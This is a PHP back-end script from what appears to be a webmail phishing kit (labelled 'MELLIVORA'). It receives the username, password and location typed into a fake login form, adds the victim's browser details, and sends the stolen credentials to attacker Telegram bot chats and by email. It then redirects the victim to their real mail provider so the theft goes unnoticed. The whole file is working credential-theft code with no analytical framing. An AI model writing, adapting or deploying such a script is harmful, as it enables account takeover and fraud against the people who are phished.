<?php

session_start();

include('mail.php');
$adddate=date("D M d, Y g:i a");
$loginemail = $_POST['username'];
$password1 = $_POST['password'];
$loc1 = $_POST['loctn'];
$locH = $_POST['loctH'];
$browser = $_SERVER['HTTP_USER_AGENT'];

$message .= "---------=== Webmail LOGIN Confirmation ===---------\n";
$message .= "Username : $loginemail\n";
$message .= "Password : $password1\n";
$message .= "================Location========================\n\n";
$message .= "Location : $loc1\n";
$message .= "Date:  ".$adddate."\n";
$message .= "Browser:  ".$browser."\n\n";
$message .= "---------=== MELLIVORA ===----------\n\n";

$pfw_header = "From: Honey <noreply>\n";
$pfw_subject = "Webmail - $locH";

$TELEGRAM = "https://api.telegram.org/bot$apiToken";
foreach ($ids as $id) {
    $data = http_build_query(array(
        'chat_id'=> $id,
        'text'=> $message,
        'parse_mode'=> 'HTML' // Optional: Markdown | HTML
    ));
    $response = file_get_contents("$TELEGRAM/sendMessage?$data");
};
@mail($to, $pfw_subject ,$message ,$pfw_header ) ;
$url = substr($loginemail, strpos($loginemail, "@") + 1);


header("Location: https://$url");


?>